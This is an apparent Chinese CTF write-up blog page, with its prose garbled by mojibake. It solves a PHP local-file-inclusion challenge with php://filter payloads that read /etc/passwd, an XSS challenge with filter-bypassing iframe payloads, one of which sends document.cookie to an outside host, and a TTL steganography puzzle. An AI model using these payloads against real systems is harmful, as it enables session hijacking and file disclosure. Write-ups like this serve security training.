                                    <h1 id="web1"><a href="#web1" class="headerlink"
                                                     title="web1"></a>web1</h1>
                                    <p>url:61.164.47.198:10000</p>
                                    <p>ç¬¬ä¸€é“æ¯”è¾ƒç®€å•ï¼Œ</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555123999.jpg" alt>
                                    </p>
                                    <p>å¾ˆæ˜æ˜¾æ˜¯æ–‡ä»¶åŒ…å«ï¼ŒåŒ…å«/etc/passwd éªŒè¯ä¸€ä¸‹ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555124105.jpg" alt>
                                    </p>
                                    <p>
                                        å¯ä»¥çœ‹åˆ°æ²¡ä»»ä½•è¿‡æ»¤ï¼Œæ¥ç€æ‰¾flagæ–‡ä»¶è‚¯å®šä¸ä¼šæ˜¯å¾ˆç®€å•ç›´æ¥åŒ…å«å¾—åˆ°ï¼Œflagæ–‡ä»¶åä¹Ÿä¸æ¸…æ¥šã€‚æ¥ç€å‘åŒ…çœ‹æºç æ‰¾åˆ°æç¤ºã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555124442.jpg" alt>
                                    </p>
                                    <pre><code>ZGlyLnBocA==</code></pre>
                                    <p>base64è§£ç </p>
                                    <pre><code>dir.php</code></pre>
                                    <p>å¸¸è§„ç›´æ¥è¯»å–æºç ï¼Œåˆ©ç”¨fileåè®®base64è¯»å–phpæºç ã€‚ã€‚</p>
                                    <pre><code>http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1555125299.jpg" alt>
                                    </p>
                                    <p>index.phpæ–‡ä»¶</p>
                                    <pre><code>&lt;?php
$a = @$_GET[&apos;file&apos;];
if (!$a) {
    $a = &apos;./templates/index.html&apos;;
}
echo &apos;include $_GET[\&apos;file\&apos;]&apos;;
if (strpos(&apos;flag&apos;,$a)!==false) {
    die(&apos;nonono&apos;);
}
include $a;
?&gt;

&lt;!--hint: ZGlyLnBocA== --&gt;</code></pre>
                                    <p>åŒç†è¯»å–dir.php</p>
                                    <pre><code>&lt;?php
$a = @$_GET[&apos;dir&apos;];
if(!$a){
$a = &apos;/tmp&apos;;
}
var_dump(scandir($a));</code></pre>
                                    <p>var_dumpå¯ä»¥ç›´æ¥è¯»å–ç›®å½•ï¼Œ</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555125517.jpg" alt>
                                    </p>
                                    <p>åœ¨æ ¹ç›®å½•ä¸‹è¯»å–åˆ°flagæ–‡ä»¶ï¼Œç›´æ¥åŒ…å«è¯»å–ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555125629.jpg" alt>
                                    </p>
                                    <h1 id="web2"><a href="#web2" class="headerlink"
                                                     title="web2"></a>web2</h1>
                                    <p>url:61.164.47.198:10001</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555125822.jpg" alt>
                                    </p>
                                    <p>å¼€å±€ä¸¤ä¸ªæ¡†ï¼Œç™»é™†å…¨é adminï¼Œäº‹å®è¯æ˜ï¼Œç‚¹å‡»ç™»é™†ä»€ä¹ˆä¹Ÿä¸è¾“å…¥ä¹Ÿèƒ½è¿›åå°ã€‚</p>
                                    <p>åå°åˆ†ä¸‰ä¸ªéƒ¨åˆ†</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555125884.jpg" alt>
                                    </p>
                                    <p>é¦–å…ˆæ˜¯ç•™è¨€ï¼Œç„¶åreportæŠ¥å‘Šé—®é¢˜ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555126231.jpg" alt>
                                    </p>
                                    <p>
                                        å†™ä¸ªè„šæœ¬è·‘å‡ºmd5å¹¶ä¸å›°éš¾ï¼ŒçŒœæµ‹æ˜¯æ„é€ xssé¡µé¢è·å–cookieï¼Œç„¶åæäº¤åˆ°ç®¡ç†å‘˜ï¼Œè·å¾—cookieï¼Œç„¶åæ‰§è¡Œå‘½ä»¤ã€‚</p>
                                    <p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ xssï¼Œ</p>
                                    <p>
                                        scriptè¢«è¿‡æ»¤äº†ï¼Œå°è¯•å„ç§æ ‡ç­¾ï¼Œå‘ç°æ ‡ç­¾æ²¡æœ‰è¿‡æ»¤ï¼Œä½†æ˜¯è§¦å‘äº‹ä»¶è¿‡æ»¤äº†ï¼Œå¦‚onload=,onerror=ï¼Œå¾ˆå¿«å¯ä»¥å‘ç°ï¼Œiframeçš„dataåè®®æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œ</p>
                                    <pre><code>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1555126781.jpg" alt>
                                    </p>
                                    <p>ç„¶åæ„é€ è·å–cookieçš„xssã€‚</p>
                                    <p>ç»è¿‡æµ‹è¯•ï¼Œ</p>
                                    <pre><code>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0naHR0cDovL3VybDo4ODg4Lz9hPScrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ+&quot;&gt;</code></pre>
                                    <p>ä¸å¤ªæ¸…æ¥šè¿™æ¡ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†ï¼Œ<br>æ¥ç€ä½¿ç”¨ä¼ªåè®®ï¼Œå®ä½“åŒ–ç»•è¿‡ã€‚</p>
                                    <pre><code>&lt;iframe src=&quot;javasc&amp;#114;ipt:window.location.href=&apos;http://47.106.185.69:8888/?a=&apos;+document.cookie&quot;&gt;</code></pre>
                                    <p>æ¥ç€å°±æ˜¯çˆ†ç ´md5æˆªæ–­è„šæœ¬ã€‚</p>
                                    <pre><code># -*- coding: utf-8 -*-

import hashlib
from multiprocessing.dummy import Pool as ThreadPool

# MD5æˆªæ–­æ•°å€¼å·²çŸ¥ æ±‚åŸå§‹æ•°æ®
# ä¾‹å­ substr(md5(captcha), 0, 6)=60b7ef

def md5(s):  # è®¡ç®—MD5å­—ç¬¦ä¸²
    return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()


keymd5 = &apos;5416ad&apos;   #å·²çŸ¥çš„md5æˆªæ–­å€¼
md5start = 0   # è®¾ç½®é¢˜ç›®å·²çŸ¥çš„æˆªæ–­ä½ç½®
md5length = 6

def findmd5(sss):    # è¾“å…¥èŒƒå›´ é‡Œé¢ä¼šè¿›è¡Œmd5æµ‹è¯•
    key = sss.split(&apos;:&apos;)
    start = int(key[0])   # å¼€å§‹ä½ç½®
    end = int(key[1])    # ç»“æŸä½ç½®
    result = 0
    for i in range(start, end):
        # print(md5(i)[md5start:md5length])
        if md5(i)[0:6] == keymd5:            # æ‹¿åˆ°åŠ å¯†å­—ç¬¦ä¸²
            result = i
            print(result)    # æ‰“å°
            break


list=[]  # å‚æ•°åˆ—è¡¨
for i in range(10):   # å¤šçº¿ç¨‹çš„æ•°å­—åˆ—è¡¨ å¼€å§‹ä¸ç»“å°¾
    list.append(str(10000000*i) + &apos;:&apos; + str(10000000*(i+1)))
pool = ThreadPool()    # å¤šçº¿ç¨‹ä»»åŠ¡
pool.map(findmd5, list) # å‡½æ•° ä¸å‚æ•°åˆ—è¡¨
pool.close()
pool.join()</code></pre>
                                    <p>æ­¤é¢˜çƒ‚å°¾ï¼Œé¢˜ç›®æ— è¾œæš´æ¯™ï¼</p>
                                    <h1 id="misc-TTL"><a href="#misc-TTL" class="headerlink"
                                                         title="misc-TTL"></a>misc-TTL</h1>
                                    <p>è¿˜æœ‰ä¸€é“æœ‰æ„æ€çš„miscè®°å½•ä¸€ä¸‹ã€‚</p>
                                    <p>é¢˜ç›®æè¿°ï¼š</p>
                                    <pre><code>æˆ‘ä»¬æˆªè·äº†ä¸€äº›IPæ•°æ®æŠ¥ï¼Œå‘ç°æŠ¥æ–‡å¤´ä¸­çš„TTLå€¼ç‰¹åˆ«å¯ç–‘ï¼Œæ€€ç–‘æ˜¯é€šä¿¡æ–¹åµŒå…¥äº†æ•°æ®åˆ°TTLï¼Œæˆ‘ä»¬å°†è¿™äº›TTLå€¼æå–äº†å‡ºæ¥ï¼Œä½ èƒ½çœ‹å‡ºä»€ä¹ˆç«¯å€ªå—ï¼Ÿ</code></pre>
                                    <p>ç„¶åæ˜¯ä¸€æ®µå¥‡æ€ªçš„TTLå­—æ®µï¼ŒäºŒåå‡ ä¸‡æ¡è¿™é‡Œå°±ä¸å†™å‡ºæ¥äº†ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555135077.jpg" alt>
                                    </p>
                                    <p>ç„¶åç™¾åº¦æœç´¢TTL éšè—ä¿¡æ¯ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555135254.jpg" alt>
                                    </p>
                                    <p>è¿™ä¹ˆä¸€è¯´ç¡®å®åº”è¯¥æ˜¯è¿™ç§éšè—ï¼Œå› ä¸ºç»™çš„æ•°å­—127 191 63 åå…­ä½éƒ½æ˜¯111111</p>
                                    <p>127 ==&gt;&gt; 01111111<br>63 ==&gt;&gt; 00111111<br>191 ==&gt;&gt;
                                        10111111<br>255 ==&gt;&gt; 11111111</p>
                                    <p>æŒ‰é“ç†è¯´åªæœ‰è¿™å››ä¸ªæ•°å­—ï¼Œå› ä¸ºåå…­ä¸ªæ•°å­—æ˜¯å›ºå®šçš„ï¼Œå‰ä¸¤ä¸ªæ•°å­— åªæœ‰ä¸¤ç§é€‰æ‹©ï¼Œ2X2=4ã€‚</p>
                                    <p>æ¥ä¸‹æ¥å†™è„šæœ¬æå–å‡ºæ¥æ¯ä¸ªäºŒè¿›åˆ¶çš„å‰ä¸¤ä½ã€‚</p>
                                    <pre><code>import binascii
key=open(&apos;./ttl.txt&apos;,&apos;r&apos;)
f1 = open(&quot;./1.txt&quot;,&quot;a+&quot;)
f2 = open(&quot;./2.txt&quot;,&quot;a+&quot;)
a=0
for ttl in key.readlines():
    if(ttl[4:7]==&quot;127&quot;):
        f1.write(&quot;01&quot;)
        a=a+1
        if a%4==0:
            f1.write(&quot;\n&quot;)
    elif(ttl[4:6]==&quot;63&quot;):
        f1.write(&quot;00&quot;)
        a=a+1
        if a%4==0:
            f1.write(&quot;\n&quot;)
    elif(ttl[4:7]==&quot;191&quot;):
        f1.write(&quot;10&quot;)
        a=a+1
        if a%4==0:
            f1.write(&quot;\n&quot;)
    elif(ttl[4:7]==&quot;255&quot;):
        f1.write(&quot;11&quot;)
        a=a+1
        if a%4==0:
            f1.write(&quot;\n&quot;)

f3 = open(&quot;./1.txt&quot;,&quot;r&quot;)
for ttls in f3.readlines():
    f2.write(chr(int(ttls,2)))

with open(&apos;./2.txt&apos;, &apos;rt&apos;) as f:
    data = f.read()
flag = binascii.unhexlify(data)#è½¬åŒ–ä¸º16è¿›åˆ¶çš„å›¾ç‰‡

f4 = open(&quot;1.jpg&quot;,&apos;wb&apos;)
f4.write(flag)</code></pre>
                                    <p>å¾—åˆ°ç»“æœã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555137914.jpg" alt>
                                    </p>
                                    <p>å†…å®¹å¤ªå¤šå®åœ¨ä¸åƒflagï¼Œä½†æ˜¯ç»†å¿ƒç‚¹è§‚å¯Ÿå¯ä»¥çœ‹åˆ°å‰å››ä½æ˜¯ffd8 jpgå›¾ç‰‡çš„æ ¼å¼ã€‚</p>
                                    <p>å¾—åˆ°æœ€ç»ˆå›¾ç‰‡ï¼Œè²Œä¼¼æ˜¯ä¸ªäºŒç»´ç ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555138855.jpg" alt>
                                    </p>
                                    <p>ä½†æ˜¯ä¸å…¨ï¼Œåº”è¯¥æ˜¯éœ€è¦åˆ†ç¦»ã€‚foremoståˆ†ç¦»ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555139015.jpg" alt>
                                    </p>
                                    <p>æå–äº”å¼ äºŒç»´ç å›¾ç‰‡ï¼Œæ‹¼æ¥æˆä¸€å¼ å®Œæ•´çš„äºŒç»´ç å›¾ç‰‡ã€‚</p>
                                    <p>åŠ ä¸ŠåŸæ¥çš„ä¸€å…±å…­å¼ å›¾ç‰‡æ‹¼æˆäºŒç»´ç ï¼Œå¾—åˆ°flagã€‚</p>


                                </div>


                                <footer class="post-footer">


                                    <div class="post-eof"></div>

                                </footer>
                            </div>


                        </article>


                    </section>


                    <nav class="pagination">
                        <span class="page-number current">1</span><a class="page-number"
                                                                     href="/page/2/">2</a><span
                            class="space">&hellip;</span><a class="page-number"
                                                            href="/page/5/">5</a><a
                            class="extend next" rel="next" href="/page/2/"><i
                            class="fa fa-angle-right"></i></a>
                    </nav>


                </div>


            </div>


            <div class="sidebar-toggle">
                <div class="sidebar-toggle-line-wrap">
                    <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
                    <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
                    <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
                </div>
            </div>

            <aside id="sidebar" class="sidebar">

                <div class="sidebar-inner">


                    <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
                        <div class="site-overview">
                            <div class="site-author motion-element" itemprop="author" itemscope
                                 itemtype="http://schema.org/Person">

                                <img class="site-author-image" itemprop="image"
                                     src="/images/avatar.ico" alt="å°çŒªä½©å¥‡">

                                <p class="site-author-name" itemprop="name">å°çŒªä½©å¥‡</p>
                                <p class="site-description motion-element"
                                   itemprop="description"></p>
                            </div>

                            <nav class="site-state motion-element">


                                <div class="site-state-item site-state-posts">

                                    <a href="/archives/">

                                        <span class="site-state-item-count">46</span>
                                        <span class="site-state-item-name">æ—¥å¿—</span>
                                    </a>
                                </div>


                                <div class="site-state-item site-state-tags">

                                    <span class="site-state-item-count">6</span>
                                    <span class="site-state-item-name">æ ‡ç­¾</span>

                                </div>


                            </nav>


                        </div>
                    </section>


                </div>
            </aside>


        </div>
    </main>

    <footer id="footer" class="footer">
        <div class="footer-inner">
            <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
                <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
                <span class="author" itemprop="copyrightHolder">å°çŒªä½©å¥‡</span>


            </div>


            <div class="powered-by">
                <i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  æœ¬ç«™è®¿å®¢æ•°:<span id="busuanzi_value_site_uv"></span>
</span>
            </div>


            <script async
                    src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


        </div>
    </footer>


    <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>

    </div>


</div>


<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }

</script>


<script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>


<script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>


<script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>


<script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>


<script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


<script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


<script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

<script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>


<script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>


<script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });

</script>
</body>
</html>
